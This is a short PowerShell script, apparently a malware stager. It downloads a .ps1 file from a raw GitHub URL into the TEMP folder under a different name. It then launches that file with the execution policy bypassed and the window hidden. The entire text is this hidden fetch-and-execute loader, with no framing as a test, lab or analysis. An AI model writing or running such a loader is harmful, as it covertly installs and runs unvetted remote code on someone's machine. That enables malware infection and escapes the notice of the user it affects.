$src  = "https://raw.githubusercontent.com/AnatolikFFF/kupikupi_nonono/main/test4.ps1"
$dest = Join-Path $env:TEMP "test3.ps1"

Invoke-WebRequest -Uri $src -OutFile $dest

Start-Process -FilePath "powershell.exe" `
  -ArgumentList @("-NoProfile","-ExecutionPolicy","Bypass","-WindowStyle","Hidden","-File",$dest) `
  -WindowStyle Hidden
